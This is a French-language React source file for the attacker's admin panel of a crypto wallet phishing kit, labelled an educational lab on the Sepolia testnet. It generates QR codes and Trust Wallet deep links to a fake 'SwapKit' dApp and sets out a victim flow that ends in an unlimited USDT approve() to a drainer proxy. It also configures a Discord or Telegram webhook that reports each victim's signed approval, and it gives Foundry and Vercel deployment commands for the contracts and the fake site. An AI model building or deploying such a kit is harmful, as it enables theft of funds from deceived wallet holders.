import { useState, useEffect, useRef } from 'react'

// ─────────────────────────────────────────────────────────────
// QR CODE GENERATOR — utilise l'API Google Charts (simple, fiable)
// En prod remplacer par la lib qrcode npm
// ─────────────────────────────────────────────────────────────
function QRCodeImage({ url, size = 200 }) {
  const encoded = encodeURIComponent(url)
  const src = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encoded}&bgcolor=ffffff&color=000000&margin=10`
  return (
    <div style={{
      background: 'white', padding: 12, borderRadius: 12,
      display: 'inline-block', boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
    }}>
      <img src={src} width={size} height={size} alt="QR Code" style={{ display: 'block' }} />
    </div>
  )
}

export default function AdminPage() {
  const [config, setConfig] = useState({
    aggregatorAddress: '',
    proxyAddress: '',
    usdtAddress: '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06',
    deployedUrl: window.location.origin,
    webhookUrl: '',
  })
  const [logs, setLogs] = useState([])
  const [tab, setTab] = useState('qr')
  const [qrUrl, setQrUrl] = useState('')
  const [copied, setCopied] = useState(false)

  // Construire l'URL du faux dApp avec les paramètres
  useEffect(() => {
    const params = new URLSearchParams({
      ref: 'qr',
      contract: config.aggregatorAddress || '0xPENDING',
    })
    setQrUrl(`${config.deployedUrl}/?${params}`)
  }, [config])

  // Deep link Trust Wallet
  const trustDeepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(qrUrl)}`

  function copyToClipboard(text) {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const tabs = [
    { id: 'qr', label: '📱 QR Code' },
    { id: 'config', label: '⚙️ Config' },
    { id: 'logs', label: `📡 Logs (${logs.length})` },
    { id: 'foundry', label: '🔨 Foundry' },
    { id: 'env', label: '🔑 .env' },
  ]

  return (
    <div style={{
      minHeight: '100vh', background: '#0a0a0f', color: '#e2e8f0',
      fontFamily: 'system-ui, sans-serif', padding: 16
    }}>
      {/* Header */}
      <div style={{
        background: 'linear-gradient(135deg, #1a0a0a, #0a0a1a)',
        border: '1px solid #7f1d1d', borderRadius: 12, padding: '14px 20px',
        marginBottom: 20, display: 'flex', justifyContent: 'space-between', alignItems: 'center'
      }}>
        <div>
          <div style={{ fontWeight: 800, fontSize: 18, color: '#f87171' }}>
            🔬 Phishing Lab — Panel Attaquant
          </div>
          <div style={{ fontSize: 11, color: '#6b7280' }}>Sepolia Testnet · USDT Target</div>
        </div>
        <div style={{
          background: '#7f1d1d', borderRadius: 8, padding: '5px 12px',
          fontSize: 11, color: '#fca5a5', fontWeight: 600
        }}>⚠️ EDU ONLY</div>
      </div>

      {/* Tabs */}
      <div style={{ display: 'flex', gap: 6, marginBottom: 20, flexWrap: 'wrap' }}>
        {tabs.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)} style={{
            background: tab === t.id ? '#1e3a5f' : '#111120',
            border: `1px solid ${tab === t.id ? '#3b82f6' : '#2a2a3e'}`,
            borderRadius: 8, padding: '8px 16px', color: tab === t.id ? '#93c5fd' : '#9ca3af',
            cursor: 'pointer', fontSize: 13, fontWeight: tab === t.id ? 600 : 400
          }}>{t.label}</button>
        ))}
      </div>

      {/* ── QR CODE ── */}
      {tab === 'qr' && (
        <div style={{ display: 'flex', gap: 20, flexWrap: 'wrap' }}>
          {/* QR standard */}
          <div style={{
            background: '#111120', border: '1px solid #2a2a3e',
            borderRadius: 12, padding: 24, flex: '0 0 auto'
          }}>
            <div style={{ fontWeight: 700, marginBottom: 4, color: '#f1f5f9' }}>
              QR → SwapKit dApp
            </div>
            <div style={{ fontSize: 12, color: '#6b7280', marginBottom: 16 }}>
              Scan → ouvre le navigateur
            </div>
            <QRCodeImage url={qrUrl} size={200} />
            <div style={{ marginTop: 12, fontSize: 10, color: '#4b5563', wordBreak: 'break-all', maxWidth: 220 }}>
              {qrUrl}
            </div>
          </div>

          {/* QR Trust Wallet Deep Link */}
          <div style={{
            background: '#111120', border: '1px solid #f59e0b40',
            borderRadius: 12, padding: 24, flex: '0 0 auto'
          }}>
            <div style={{ fontWeight: 700, marginBottom: 4, color: '#fbbf24' }}>
              QR → Trust Wallet Direct
            </div>
            <div style={{ fontSize: 12, color: '#6b7280', marginBottom: 16 }}>
              Scan → ouvre Trust Wallet directement
            </div>
            <QRCodeImage url={trustDeepLink} size={200} />
            <div style={{ marginTop: 12, fontSize: 10, color: '#4b5563', wordBreak: 'break-all', maxWidth: 220 }}>
              link.trustwallet.com/open_url?...
            </div>
          </div>

          {/* Infos */}
          <div style={{ flex: 1, minWidth: 260 }}>
            <div style={{
              background: '#111120', border: '1px solid #2a2a3e',
              borderRadius: 12, padding: 20, marginBottom: 16
            }}>
              <div style={{ fontWeight: 700, color: '#f1f5f9', marginBottom: 12 }}>
                URLs générées
              </div>
              {[
                { label: 'URL dApp', value: qrUrl },
                { label: 'Deep link Trust', value: trustDeepLink },
              ].map(item => (
                <div key={item.label} style={{ marginBottom: 12 }}>
                  <div style={{ fontSize: 11, color: '#6b7280', marginBottom: 4 }}>{item.label}</div>
                  <div style={{
                    background: '#0d0d1a', borderRadius: 8, padding: '8px 12px',
                    fontSize: 11, color: '#93c5fd', wordBreak: 'break-all',
                    fontFamily: 'monospace', cursor: 'pointer',
                    border: '1px solid #1e2a4a'
                  }} onClick={() => copyToClipboard(item.value)}>
                    {item.value.slice(0, 60)}...
                    <span style={{ color: '#4b5563', marginLeft: 8 }}>📋</span>
                  </div>
                </div>
              ))}
              {copied && (
                <div style={{ fontSize: 11, color: '#10b981' }}>✓ Copied!</div>
              )}
            </div>

            {/* Comment ça marche */}
            <div style={{
              background: '#111120', border: '1px solid #2a2a3e',
              borderRadius: 12, padding: 20
            }}>
              <div style={{ fontWeight: 700, color: '#f1f5f9', marginBottom: 12 }}>
                Flow Trust Wallet
              </div>
              {[
                { n: '1', t: 'Victime scanne le QR Trust', c: '#6366f1' },
                { n: '2', t: 'Trust Wallet s\'ouvre automatiquement', c: '#8b5cf6' },
                { n: '3', t: 'Le dApp se charge dans le browser intégré', c: '#ec4899' },
                { n: '4', t: '"Connect Wallet" → déjà connecté dans Trust', c: '#f59e0b' },
                { n: '5', t: '"Approve USDT" → popup de signature', c: '#ef4444' },
                { n: '6', t: 'approve(proxy, MAX) signé → wallet exposé', c: '#ef4444' },
              ].map(s => (
                <div key={s.n} style={{
                  display: 'flex', gap: 10, marginBottom: 8, alignItems: 'flex-start'
                }}>
                  <div style={{
                    width: 20, height: 20, background: s.c + '30', border: `1px solid ${s.c}`,
                    borderRadius: 5, display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontSize: 10, fontWeight: 700, color: s.c, flexShrink: 0
                  }}>{s.n}</div>
                  <div style={{ fontSize: 12, color: '#c9d1d9', lineHeight: 1.5 }}>{s.t}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ── CONFIG ── */}
      {tab === 'config' && (
        <div style={{
          background: '#111120', border: '1px solid #2a2a3e',
          borderRadius: 12, padding: 24, maxWidth: 600
        }}>
          <div style={{ fontWeight: 700, color: '#f1f5f9', marginBottom: 20 }}>
            Configuration du lab
          </div>
          {[
            { key: 'aggregatorAddress', label: 'Aggregator Address (après déploiement Foundry)', placeholder: '0x...' },
            { key: 'proxyAddress', label: 'TokenTransferProxy Address', placeholder: '0x...' },
            { key: 'usdtAddress', label: 'USDT Sepolia Address', placeholder: '0x7169...' },
            { key: 'deployedUrl', label: 'URL Vercel déployée', placeholder: 'https://ton-projet.vercel.app' },
            { key: 'webhookUrl', label: 'Webhook URL (Discord/Telegram bot pour recevoir les logs)', placeholder: 'https://discord.com/api/webhooks/...' },
          ].map(field => (
            <div key={field.key} style={{ marginBottom: 16 }}>
              <label style={{ fontSize: 12, color: '#9ca3af', display: 'block', marginBottom: 6 }}>
                {field.label}
              </label>
              <input
                value={config[field.key]}
                onChange={e => setConfig(prev => ({ ...prev, [field.key]: e.target.value }))}
                placeholder={field.placeholder}
                style={{
                  width: '100%', background: '#0d0d1a', border: '1px solid #2a2a3e',
                  borderRadius: 8, padding: '10px 14px', color: '#f1f5f9',
                  fontSize: 13, fontFamily: 'monospace', outline: 'none'
                }}
              />
            </div>
          ))}
          <div style={{ fontSize: 12, color: '#6b7280', marginTop: 8 }}>
            Ces valeurs servent à construire les QR codes ci-dessus en temps réel.
          </div>
        </div>
      )}

      {/* ── LOGS ── */}
      {tab === 'logs' && (
        <div style={{
          background: '#0d1117', border: '1px solid #21262d',
          borderRadius: 12, padding: 20, minHeight: 300,
          fontFamily: 'monospace', fontSize: 12
        }}>
          <div style={{ color: '#10b981', marginBottom: 16, fontWeight: 700 }}>
            📡 Événements reçus via webhook
          </div>
          {logs.length === 0 ? (
            <div>
              <div style={{ color: '#4b5563' }}>Aucun événement reçu.</div>
              <div style={{ color: '#374151', marginTop: 8 }}>
                Configure le VITE_WEBHOOK_URL dans .env pour recevoir les approve() en temps réel.<br />
                Exemple avec Discord : créer un webhook dans ton serveur → coller l'URL.
              </div>
              <div style={{ marginTop: 20, color: '#6b7280' }}>
                Payload reçu à chaque approve signé :
              </div>
              <pre style={{ color: '#93c5fd', marginTop: 8, background: '#0a0a0f', padding: 12, borderRadius: 8 }}>
{`{
  "event": "APPROVE_SIGNED",
  "victim": "0xABCD...1234",
  "token": "USDT",
  "spender": "0x<PROXY_ADDRESS>",
  "allowance": "MAX_UINT256",
  "txHash": "0x...",
  "timestamp": "2024-01-15T12:34:56Z",
  "network": "sepolia"
}`}
              </pre>
            </div>
          ) : logs.map((log, i) => (
            <div key={i} style={{ color: '#ef4444', marginBottom: 12 }}>
              ⚡ {JSON.stringify(log, null, 2)}
            </div>
          ))}
        </div>
      )}

      {/* ── FOUNDRY ── */}
      {tab === 'foundry' && (
        <div style={{
          background: '#0d1117', border: '1px solid #21262d',
          borderRadius: 12, padding: 20
        }}>
          <div style={{ fontWeight: 700, color: '#f0f6fc', marginBottom: 16 }}>
            Déploiement Foundry sur Sepolia
          </div>
          <pre style={{ fontSize: 12, lineHeight: 1.8, color: '#c9d1d9', overflowX: 'auto', margin: 0 }}>
{`# ── 1. Installer Foundry ──────────────────────────────────
curl -L https://foundry.paradigm.xyz | bash
foundryup

# ── 2. Init projet ────────────────────────────────────────
forge init phishing-contracts
cd phishing-contracts

# ── 3. Copier le contrat SKAggregator_V1_Lab.sol dans src/

# ── 4. Créer le script de déploiement ────────────────────
# script/Deploy.s.sol (voir onglet précédent)

# ── 5. Obtenir des ETH Sepolia gratuits ───────────────────
# https://sepoliafaucet.com  (1 ETH/jour)
# https://faucet.quicknode.com/ethereum/sepolia

# ── 6. Déployer sur Sepolia ───────────────────────────────
forge script script/Deploy.s.sol \\
  --rpc-url https://rpc.sepolia.org \\
  --private-key $PRIVATE_KEY \\
  --broadcast \\
  --verify \\
  --etherscan-api-key $ETHERSCAN_API_KEY

# Output exemple :
# TokenTransferProxy deployed at: 0xABCD...
# Aggregator deployed at: 0xEFGH...

# ── 7. Vérifier sur Etherscan ─────────────────────────────
# https://sepolia.etherscan.io/address/0xEFGH...

# ── 8. Copier les adresses dans .env Vercel ───────────────
# VITE_AGGREGATOR_ADDRESS=0xEFGH...
# VITE_PROXY_ADDRESS=0xABCD...`}
          </pre>
        </div>
      )}

      {/* ── ENV ── */}
      {tab === 'env' && (
        <div style={{
          background: '#0d1117', border: '1px solid #21262d',
          borderRadius: 12, padding: 20, maxWidth: 600
        }}>
          <div style={{ fontWeight: 700, color: '#f0f6fc', marginBottom: 16 }}>
            Fichier .env.local (à créer à la racine)
          </div>
          <pre style={{ fontSize: 13, lineHeight: 1.8, color: '#c9d1d9', background: '#0a0a0f', padding: 16, borderRadius: 8, margin: 0 }}>
{`# ─── Adresses contrats (après déploiement Foundry) ───
VITE_AGGREGATOR_ADDRESS=0x...
VITE_PROXY_ADDRESS=0x...
VITE_USDT_ADDRESS=0x7169D38820dfd117C3FA1f22a697dBA58d90BA06

# ─── Webhook pour recevoir les approve() ───
# Option 1 : Discord webhook
VITE_WEBHOOK_URL=https://discord.com/api/webhooks/XXX/YYY

# Option 2 : Telegram bot
# VITE_WEBHOOK_URL=https://api.telegram.org/botTOKEN/sendMessage?chat_id=ID

# ─── Sur Vercel : Settings > Environment Variables ───
# Ajouter les mêmes variables`}
          </pre>
          <div style={{ marginTop: 20 }}>
            <div style={{ fontWeight: 700, color: '#f0f6fc', marginBottom: 12 }}>
              Déployer sur Vercel
            </div>
            <pre style={{ fontSize: 12, lineHeight: 1.8, color: '#c9d1d9', background: '#0a0a0f', padding: 16, borderRadius: 8, margin: 0 }}>
{`# 1. Installer Vercel CLI
npm i -g vercel

# 2. Login
vercel login

# 3. Déployer depuis la racine du projet
vercel

# 4. Variables d'environnement sur Vercel
vercel env add VITE_AGGREGATOR_ADDRESS
vercel env add VITE_PROXY_ADDRESS
vercel env add VITE_WEBHOOK_URL

# 5. Redéployer avec les variables
vercel --prod

# → URL générée : https://ton-projet.vercel.app
# → /admin  = panel attaquant
# → /       = faux dApp (victime)`}
            </pre>
          </div>
        </div>
      )}
    </div>
  )
}
